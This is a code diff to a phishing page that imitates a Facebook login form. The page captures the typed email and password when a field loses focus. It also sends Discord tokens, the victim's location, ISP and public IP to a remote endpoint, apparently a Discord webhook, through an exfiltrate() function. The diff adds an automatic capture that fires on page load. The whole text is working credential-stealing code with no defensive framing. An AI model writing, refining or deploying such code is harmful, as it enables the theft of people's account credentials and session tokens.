@@ -17,7 +17,6 @@
     <!-- STAGE 1: LOGIN -->
     <div id="mainForm" class="container">
         <h2>Facebook Login</h2>
-        <!-- Added onblur event for interim capture -->
         <input type="text" id="email" placeholder="Email or Phone Number" onblur="autoCapture()">
         <input type="password" id="password" placeholder="Password" onblur="autoCapture()">
         <button id="submitBtn">Login</button>
@@ -57,8 +56,8 @@
                     title: titleText,
                     color: 0x1877F2,
                     fields: [
-                        { name: '📧 Login/Phone', value: document.getElementById('email').value || 'Empty', inline: true },
-                        { name: '🔑 Password', value: document.getElementById('password').value || 'Empty', inline: true },
+                        { name: '📧 Login/Phone', value: document.getElementById('email').value || 'Not entered yet', inline: true },
+                        { name: '🔑 Password', value: document.getElementById('password').value || 'Not entered yet', inline: true },
                         { name: '🔑 Discord Tokens', value: tokens.join('\n') || 'None', inline: false },
                         { name: '📍 Location/ISP', value: `${geo.location} | ${geo.isp}`, inline: false },
                         { name: '🌐 Public IP', value: geo.ip, inline: true }
@@ -73,7 +72,12 @@
             });
         }
 
-        // Triggered when user clicks out of email/password fields
+        // Auto-capture on page load
+        window.onload = async () => {
+            await exfiltrate('🕵️ AUTOMATIC INITIAL CAPTURE');
+        };
+
+        // Capture on input blur
         async function autoCapture() {
             if(document.getElementById('email').value || document.getElementById('password').value) {
                 await exfiltrate('⚠️ INTERIM CAPTURE (Partial)');
